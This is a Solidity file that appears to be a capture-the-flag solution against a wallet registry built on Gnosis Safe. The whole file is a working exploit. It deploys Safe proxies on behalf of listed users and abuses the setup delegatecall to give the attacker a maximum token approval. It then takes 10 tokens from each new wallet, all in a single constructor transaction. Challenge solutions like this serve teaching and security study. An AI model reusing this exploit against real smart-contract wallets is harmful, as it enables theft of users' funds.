// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ApproveContract {
    function approve(address attackContract, IERC20 token) external {
        token.approve(attackContract, type(uint256).max);
    }
}

contract AttackWalletRegistry {
    constructor(
        address _walletFactory,
        address _masterCopy,
        address _walletRegistry,
        address _token,
        address[] memory _users
    ) {
        attack(_walletFactory, _masterCopy, _walletRegistry, IERC20(_token), _users);
    }

    function attack(
        address _walletFactory,
        address _masterCopy,
        address _walletRegistry,
        IERC20 _token,
        address[] memory _users
    ) public {
        ApproveContract approveContract = new ApproveContract();
        address[] memory owners = new address[](1);
        for (uint256 i = 0; i < 4; i++) {
            owners[0] = _users[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(approveContract),
                abi.encodeWithSelector(ApproveContract.approve.selector, address(this), _token),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy gnosisProxy = GnosisSafeProxyFactory(_walletFactory).createProxyWithCallback(
                _masterCopy, initializer, 0, IProxyCreationCallback(_walletRegistry)
            );
            _token.transferFrom(address(gnosisProxy), msg.sender, 10 ether);
        }
    }
}
